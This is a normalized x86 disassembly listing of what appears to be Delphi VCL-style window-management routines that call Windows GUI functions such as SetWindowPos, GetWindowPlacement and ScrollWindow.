mov eax [ esi + 0x178 ]
call sub_418700
cmp [ eax + 0x57 ] 0x0
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec edi
sub_44e348
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x17c ] 0x0
jne r-xdata
mov eax esi
mov edx [ ebx + 0x17c ]
call sub_4057cc
cmp [ ebx + 0x1a8 ] 0x0
je r-xdata
mov al 0x1
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x1a7 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x24 ]
mov edx eax
test edx edx
je r-xdata
mov [ ebx + 0x1f8 ] al
pop esi
pop ebx
retn
mov eax esi
call sub_4057cc
jmp r-xdata
sub edx 0xffffff8c
cmp [ ebx + 0x1f8 ] 0x0
jne r-xdata
sub_44e3b4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov ebx edx
mov edi eax
xor eax eax
push ebp
push sub_44e45c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp bl [ edi + 0x1a8 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e463
lea eax [ ebp - 0x4 ]
call sub_4057b4
retn
mov [ edi + 0x1a8 ] bl
test [ edi + 0x1c ] 0x10
jne r-xdata
mov edx ebx
mov eax edi
call sub_446c30
test bl bl
jne r-xdata
cmp [ edi + 0x178 ] 0x0
jne r-xdata
mov eax [ edi + 0x178 ]
call sub_403128
xor eax eax
mov [ edi + 0x178 ] eax
lea eax [ edi + 0x17c ]
call sub_4057b4
jmp r-xdata
lea edx [ ebp - 0x4 ]
mov eax edi
mov si 0xffc6
call sub_403324
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x17c ]
call sub_4057cc
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030f8
mov [ edi + 0x178 ] eax
sub_44e46c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
lea esi [ eax + 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x2
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x4 ]
call sub_44c070
xor edx edx
push ebp
push sub_44e52e
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov si 0xffcc
call sub_403324
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44e535
mov eax [ ebp - 0x4 ]
call sub_44c078
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ eax + 0x58 ]
push edx
mov edx [ ebp - 0x8 ]
mov cl [ eax + 0x54 ]
mov edx [ ebp - 0x8 ]
mov edx [ eax + 0x38 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x17c ]
mov ebx [ eax ]
call [ ebx + 0x18 ]
sub_44e535
mov eax [ ebp - 0x4 ]
call sub_4607d8
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_44920c
sub_44e580
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_403070
cmp esi eax
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44ae58
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x57 ]
mov [ ebp - 0x5 ] al
xor eax eax
push ebp
push sub_44e5ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x8 ]
lea ecx [ eax + 0x44 ]
xor edx edx
mov eax [ ebp - 0x4 ]
mov si 0xffcc
call sub_403324
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
retn
mov eax [ ebp - 0x4 ]
call sub_44920c
sub_44e604
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1da ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1dc ]
call [ ebx + 0x1d8 ]
sub_44e62c
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4607d8
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4606c0
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbc
call sub_403324
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44e62c
test al al
jne r-xdata
sub_44e694
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e62c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_450924
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e6c0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e62c
test al al
jne r-xdata
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_450924
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e6ec
push ebx
push ecx
mov [ esp ] cl
cmp [ eax + 0x1ea ] 0x0
je r-xdata
pop edx
pop ebx
retn
mov cl [ esp ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0x1ec ]
call [ ebx + 0x1e8 ]
sub_44e714
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4607d8
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_4606c0
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_403324
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44e714
test al al
jne r-xdata
sub_44e77c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e714
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e79c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e714
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e7dc
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_4607d8
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_403324
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_44e7dc
test al al
jne r-xdata
sub_44e840
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44e7dc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e860
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44c508
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_44c4cc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_44a198
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_44e860
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_44e910
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_44e860
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_4607d8
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_44a198
test eax eax
jne r-xdata
sub_44e9b8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44d458
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44e9d8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44d458
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44ea0c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_44d458
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44ea2c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_44ea7c
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_44eaa0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_448250
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_44c508
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_44c4cc
mov dl [ esp ]
mov si 0xffd1
call sub_403324
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_44eaf8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_403324
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44eb1c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_403324
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44eb54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ac6c
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_44c568
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_44cd78
sub_44eb8c
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_403324
pop esi
pop ebx
retn
mov eax ebx
call sub_449628
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_404378
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_404378
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_44ec0c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44d158
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_44ad40
sub_44ec6c
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_44cecc
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_44c2c8
pop ebx
retn
sub_44ec9c
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_44ecc4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_44fadc
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_44c2c8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_44ed34
push ebx
mov ebx eax
mov eax ebx
call sub_44abac
mov eax ebx
call sub_44fadc
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_44c568
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_424280
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_44a198
sub_44ed70
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_447830
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_44f7d8
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_44a198
sub_44edb0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_44fadc
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_44f7d8
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_44edf0
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_44c568
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_44fadc
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_44f6e0
sub_44ee30
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_44f918
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_44f918
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_44ee90
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_449bf4
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_448af0
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_44d0c4
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_44ef00
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ace4
mov edx esi
mov eax ebx
call sub_44c528
pop esi
pop ebx
retn
sub_44ef1c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_445e68
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_4607d8
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_403324
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_403324
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_403324
test al al
jne r-xdata
sub_44efb0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_450924
mov edx esi
mov eax ebx
call sub_44ef1c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44a198
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_44a198
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44a198
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4607d8
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44a198
test eax eax
jne r-xdata
jmp r-xdata
sub_44f094
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_44a198
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_44f0e8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_44a198
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4607d8
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44a198
test eax eax
jne r-xdata
sub_44f134
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_44ef1c
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_44a198
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4607d8
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_44a198
test eax eax
jne r-xdata
sub_44f190
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_4607d8
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_44a198
mov [ esi + 0xc ] eax
sub_44f1c4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_44fadc
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_44fadc
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_4485d8
mov eax ebx
mov si 0xffd0
call sub_403324
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_44894c
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_44f29c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_44c508
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_44c4cc
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_403324
inc edi
dec ebx
jne r-xdata
sub_44f2e4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44c070
xor eax eax
push ebp
push sub_44f382
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_44f29c
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_448bc8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44f389
mov eax [ ebp - 0x4 ]
call sub_44c078
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_44f390
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_44c508
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_44c098
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_44c4cc
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_44f480
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_41875c
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
